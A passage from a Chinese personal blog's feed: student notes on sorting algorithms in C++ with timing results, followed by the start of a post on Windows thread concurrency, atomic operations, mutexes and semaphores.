class="built_in">advance</span>(mid, std::<span class="built_in">distance</span>(low, high) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (*mid &lt; tmp) &#123;</span><br><span class="line">low = std::<span class="built_in">next</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">high = mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> j = i; j &gt; low; --j) &#123;</span><br><span class="line">*j = *std::<span class="built_in">prev</span>(j);</span><br><span class="line">&#125;</span><br><span class="line">*low = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00054250</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">5</span>.<span class="number">42496460</span></span><br></pre></td></tr></table></figure><p>我多试了几次(20长度)，发现比直接插入的速度慢，难道是我写错了？QAQ，可能是算法太菜了。</p><p>外循环$O(n)$，内循环查找+插入$O(log_2n)+O(n)$，所以总体时间复杂度：$O(nlog_2n)+O(n^2)&#x3D;O(n^2)$，对于最好时间，已排序完成，$O(n)$，最差时间，倒序$O(n^2)$</p><p>这么一看在n小时用直接插入，n大时用二分插入更好。<br>对于空间复杂度，由于有4个额外空间，所以是$O(4)$</p><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p>又叫缩小增量排序。直接插入排序有两个性质，在快排序好时，效率高，大概能到O(n)，但是插入操作十分低效因为每次都只能移动一位。所以希尔排序先划分小块分别插入排序，然后再总体插入排序。</p><p>那么选取H，即间隔就很重要了，这里有两篇文章</p><p><a href="https://oi-wiki.org/basic/shell-sort/">希尔排序 - OI Wiki</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F#.E6.AD.A5.E9.95.BF.E5.BA.8F.E5.88.97">希尔排序 - 维基百科，自由的百科全书</a></p><p>都提到了比较好的H选择，因为Sedgewick步长有点不好写，这里直接就用原作者的排序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt; gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, <span class="keyword">auto</span> function)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">function</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [](<span class="type">int</span> arr[], <span class="type">int</span> gap, <span class="type">const</span> <span class="type">int</span> len) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = i;</span><br><span class="line"><span class="keyword">auto</span> tmp = arr[i];<span class="comment">//防止j=i时arr[i]被修改</span></span><br><span class="line"><span class="keyword">while</span> (j - gap &gt; <span class="number">0</span> &amp;&amp; arr[j - gap] &gt; tmp) &#123;</span><br><span class="line">arr[j] = arr[j - gap];</span><br><span class="line">j -= gap;</span><br><span class="line">&#125;</span><br><span class="line">arr[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="built_in">return</span> (<span class="type">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g, len);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">shellSort</span><span class="params">(Container&amp; arr)</span> </span>&#123;</span><br><span class="line">std::deque&lt;<span class="type">int</span>&gt;gap = &#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> first = std::<span class="built_in">begin</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> end = std::<span class="built_in">end</span>(arr);</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">auto</span> gapinit = [&amp;gap](<span class="type">int</span> len, std::function&lt;<span class="built_in">int</span>(<span class="type">int</span>)&gt; func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">func</span>(i);</span><br><span class="line"><span class="keyword">if</span> (x &gt; len)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">gap.<span class="built_in">insert</span>(gap.<span class="built_in">begin</span>(), x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">auto</span> sort = [first, end](Container&amp; container, <span class="type">int</span> gap)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> len = std::<span class="built_in">distance</span>(first, end);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = gap; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> tmp = (*(first + i));</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = i; j &gt;= gap &amp;&amp; *(first + j - gap) &gt; tmp; j -= gap)</span><br><span class="line">&#123;</span><br><span class="line">*(first + j) = *(first + j - gap);</span><br><span class="line">&#125;</span><br><span class="line">*(first + j) = (tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">gapinit</span>(len, [](<span class="type">int</span> i) &#123;</span><br><span class="line"><span class="keyword">return</span> std::<span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> g : gap) &#123;</span><br><span class="line"><span class="built_in">sort</span>(arr, g);</span><br><span class="line"><span class="built_in">pArr</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00008865</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">88646020</span></span><br></pre></td></tr></table></figure><p>可以看出，速度相较之前的两个提升了5倍不止。</p><p>对于希尔算法的时间复杂度，需要额外考虑gap的值，不同的值对应不同的复杂度，比如说增量为2的倍数，那么同一个组中2的倍数会多次比较，改成<code>pow(3,i)</code>后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00007897</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">78967320</span></span><br></pre></td></tr></table></figure><p>很稳定地提高了大约0.1s。所以只能说大致来看时间复杂度在$O(nlog(n))$，对于以2的平方为间隔的，在完全倒序的情况下最差会退化到$O(n^2)$。查资料的时候发现，这是世界上第一个突破$O(n^2)$的排序算法，真强。<br>对于空间复杂度，由于额外占用一个tmp，所以为$O(1)$</p><h1 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h1><p>交换排序是指这一次排序的元素与其它元素交换最后实现的排序</p><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>稳定的排序</p><p>经典老熟人，就不多说了，直接上代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = len; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; j - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (arr[i] &gt; arr[i + <span class="number">1</span>]) &#123;</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//pArr(arr, 20);</span></span><br><span class="line"><span class="keyword">if</span> (sorted)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container&gt;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bubbleSort</span><span class="params">(Container&amp; container)</span> </span>&#123;</span><br><span class="line"><span class="type">bool</span> sorted = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> end = std::<span class="built_in">end</span>(container); !sorted &amp;&amp; end != std::<span class="built_in">begin</span>(container); --end) &#123;</span><br><span class="line">sorted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it = std::<span class="built_in">begin</span>(container); std::<span class="built_in">next</span>(it) != end; ++it) &#123;</span><br><span class="line"><span class="keyword">if</span> (*it &gt; *std::<span class="built_in">next</span>(it)) &#123;</span><br><span class="line">std::<span class="built_in">swap</span>(*it, *std::<span class="built_in">next</span>(it));</span><br><span class="line">sorted = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pArr</span>(container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00132296</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">13</span>.<span class="number">22964510</span></span><br></pre></td></tr></table></figure><p>很慢，可能只适合小数组，定死的两重循环让它只能在$O(n^2)$上，除了运气很好刚好有序，则只需$O(n)$</p><p>空间复杂度$O(1)$</p><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><del>顾名思义，很快的排序</del>。每次排序时，定义一个基准值（一般是开头元素或结尾元素）然后从左和右分别引出指针，基准远离的那个指针开始向中心移动，遇到小于基准值的就复制到离基准近的位置，然后近的指针移动找大于基准值的，复制到远离基准的指针位置，两个指针相遇后，将基准赋值到这里。然后分别对左边和右边执行这个操作。因此要使用递归。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">quickSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">di</span> &#123;</span><br><span class="line">left,</span><br><span class="line">right</span><br><span class="line">&#125;;</span><br><span class="line">std::function&lt;<span class="type">void</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; sort;</span><br><span class="line">sort = [&amp;arr, &amp;sort](<span class="type">int</span> is, <span class="type">int</span> ie) &#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">if</span> (is == ie)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (is + <span class="number">1</span> == ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[is] &gt; arr[ie])</span><br><span class="line">std::<span class="built_in">swap</span>(arr[is], arr[ie]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">di diriction = right;</span><br><span class="line"><span class="type">int</span> ieb = ie;</span><br><span class="line"><span class="type">int</span> isb = is;</span><br><span class="line"><span class="keyword">auto</span> base = arr[is];</span><br><span class="line"><span class="keyword">while</span> (is &lt; ie) &#123;</span><br><span class="line"><span class="keyword">if</span> (diriction == right) &#123;</span><br><span class="line"><span class="keyword">while</span> (base &lt;= arr[ie] &amp;&amp; is &lt; ie)</span><br><span class="line">ie--;</span><br><span class="line">arr[is] = arr[ie];</span><br><span class="line">diriction = left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (base &gt; arr[is] &amp;&amp; is &lt; ie)</span><br><span class="line">&#123;</span><br><span class="line">is++;</span><br><span class="line">&#125;</span><br><span class="line">arr[ie] = arr[is];</span><br><span class="line">diriction = right;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">arr[is] = base;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; base &lt;&lt; std::endl;</span></span><br><span class="line"><span class="keyword">if</span> (is &gt; isb)</span><br><span class="line"><span class="built_in">sort</span>(isb, is - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (is &lt; ieb)</span><br><span class="line"><span class="built_in">sort</span>(is + <span class="number">1</span>, ieb);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">sort</span>(<span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面就不写模板了QAQ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00006714</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">0</span>.<span class="number">67141270</span></span><br></pre></td></tr></table></figure><p>可以看出确实很快，比希尔又少了0.1s左右。由于每次是折半,所以速度是$O(nlog(n))$，最坏情况下，每次的枢轴是最大值或最少值，相当于二叉树退化为链表，所以是$O(n^2)$对应的，由于有折半次的递归，所以空间复杂度是$O(logn)$</p><h1 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h1><h2 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h2><p>每次循环时选择一个最小的数，和当前轮次i的元素交换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">selectSort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">const</span> <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index = i;</span><br><span class="line"><span class="type">int</span> min = arr[i];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; len; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (min &gt; arr[j]) &#123;</span><br><span class="line">min = arr[j];</span><br><span class="line">index = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::<span class="built_in">swap</span>(arr[i], arr[index]);</span><br><span class="line"><span class="built_in">pArr</span>(arr, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Average</span> time for <span class="number">10000</span> runs and <span class="number">1000</span> elements: <span class="number">0</span>.<span class="number">00045653</span> seconds</span><br><span class="line"><span class="attribute">Total</span> time:<span class="number">4</span>.<span class="number">56533570</span></span><br></pre></td></tr></table></figure><p>这个速度比直接插入快，我觉得是因为没有执行多轮的移动元素，是冒泡的改良，但是时间复杂度还是在$O(n^2)$，空间复杂度$O(1)$，有额外的2个空间使用。</p><h2 id="树形选择排序"><a href="#树形选择排序" class="headerlink" title="树形选择排序"></a>树形选择排序</h2><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>由于我不会堆，所以这里先说堆的概念</p><h3 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h3><p>优先队列是指一个队列不按来的顺序出队，而是根据优先级的顺序出队，这就是优先队列，<br>假设按a,b,c的顺序入队，优先级分别为1,3,2，如果按优先级高的先出，出队顺序为b,c,a。可以看出为了存储n个元素优先队列，我们需要2n的空间。这很明显是不划算的。同时为了出队，我们还要把出队元素放到队首(因为只有队首才能出队)，于是我们使用了堆。</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>堆是一颗完全二叉树，加入节点需要在最下面一层从左到右排列。堆分为两种，一个叫大顶堆一个叫小顶堆，它们的性质分别是二叉树的父节点大于&#x2F;小于子节点，在初始赋值时，可能不满足这个要求，所以需要进行调整：</p><ul><li>对于树的根节点，判断条件是否满足，不满足，和子节点的值交换，满足，继续 下一步</li><li>递归对子节点执行上面的操作，直到这个子节点没有子节点</li></ul><p>时间复杂度为$O(n)$，因为对每一个节点都执行了上面的内容</p><p>删除时同样是先放到最下面一层最后（和最后一个元素交换）要保持完全二叉树的性质。然后交换后调整为对应顶堆的性质</p><h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><h1 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h1><p>table[5*k+1]</p>]]></content>
    
    
    <summary type="html">数据结构要挂科了，赶紧复习一下</summary>
    
    
    
    <category term="实践" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/"/>
    
    <category term="数据结构与算法" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    <category term="算法" scheme="https://www.pri87.vip/categories/%E5%AE%9E%E8%B7%B5/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>win-并发与同步</title>
    <link href="https://www.pri87.vip/posts/e563aa6c.html"/>
    <id>https://www.pri87.vip/posts/e563aa6c.html</id>
    <published>2024-11-18T05:13:57.000Z</published>
    <updated>2024-11-24T06:03:08.282Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇学习了基本的进程和线程，这里继续学习Windows的并发与同步<br>《Windows内核原理与实现》</p><h2 id="并发与同步"><a href="#并发与同步" class="headerlink" title="并发与同步"></a>并发与同步</h2><p>为了保证操作系统和应用有序地执行，它们读取和访问的数据应当是有效的。如果A线程使用了资源甲，进行了修改，同时B线程也对资源甲进行了修改，保存时就会产生冲突，所以我们需要一种(多种)机制去控制各个线程的顺序使得它们对资源的使用是协调的、合理的、安全的。</p><p><img src="https://s2.loli.net/2024/11/18/Ti2DFcLhquH8Qov.png" alt="并发的来源"></p><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>理想情况下,如果所有进程都具有执行条件,系统会直接根据优先级顺序将处理器资源分配给各个线程。因而唯一可能的线程冲突就是优先级的冲突。这很好解决，只要让高优先级的优先执行就好了。但是很有可能有的线程依赖另一个线程，或者依赖系统的某个信号和状态。</p><p>看下面这个书中的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line">DWORD <span class="title function_">ComputeThreadProc</span><span class="params">(PLVOID pParam)</span>&#123;</span><br><span class="line">    g_nCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(g_nCount++&lt;<span class="number">100</span>)&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> g_nCount;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ControlThreadProc</span><span class="params">(PLVOID pRaram)</span>&#123;</span><br><span class="line">    CreateThread(ComputeThreadProc);</span><br><span class="line">    g_nCount=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行ControlThreadProc函数，可能发生什么，ComputeThreadProc中的汇编可能把g_nCount保存在两个寄存器中，用RCX来循环，用RAX来执行每一轮最后的判断，那么如果主线程内执行了g_nCount&#x3D;100;，却被RCX赋值了，那么它就不会停止</p><p><img src="https://s2.loli.net/2024/11/18/cqb9BgR38V61SOC.png" alt="image-20241118135849061"></p><p>所以，多线程通信时，必须保证对变量的操作为原子操作或者对变量的访问是互斥的。</p><p>处理器中有些自带的原子操作命令，基本的指令前加lock即是原子操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LONG FASTCALL InterlockerIncrement(IN OUT LONG volatile *addr)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">        mov eax,1</span><br><span class="line">        mov ecx,addr</span><br><span class="line">        lock xadd [ecx],eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，通过lock xadd，这组指令就会变成原子操作，其它线程的操作不能插入到这个过程中</p><h3 id="通讯与同步"><a href="#通讯与同步" class="headerlink" title="通讯与同步"></a>通讯与同步</h3><p>正如上面所说，为了使程序以正常的顺序进行，我们需要一种机制去协调进程&#x2F;线程对某些数据的操作，以通讯为基础的同步机制就这样诞生了。下面的操作均为原子操作</p><h4 id="互斥和互斥体"><a href="#互斥和互斥体" class="headerlink" title="互斥和互斥体"></a>互斥和互斥体</h4><p>互斥指一个共享资源，任何时刻只能有一个主体可以访问。Windows中可以通过互斥体实现跨进程的访问</p><h5 id="互斥体同步对象"><a href="#互斥体同步对象" class="headerlink" title="互斥体同步对象"></a>互斥体同步对象</h5><p>该对象有两种状态，有信号和无信号，有信号表示该对象当前无人访问。无信号表示其已被某线程拥有，只有当该线程释放所有权后它才会变为有信号状态。</p><h4 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h4><p> 对于一个资源，有一个标识值说明当前有多少对象在使用这个资源，这个值是信号量，当值为x时，表示还可以有x个对象访问它，访问叫做DOWN，每次访问使x-1，如果x本身为0，当前线程阻塞。当对象访问结束时，执行UP操作，使x+1然后令一个阻塞的线程执行DOWN获得资源的操作权限</p><h4 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h4><p>和前面的类似，如果值为1，则不可访问并被阻塞，如果为0则可以访问，同时有局部和全局之分，如果是局部锁，它只控制一个小区域，反之是全局的控制。</p><h4 id="临界区"><a href="#临界区" class="headerlink" 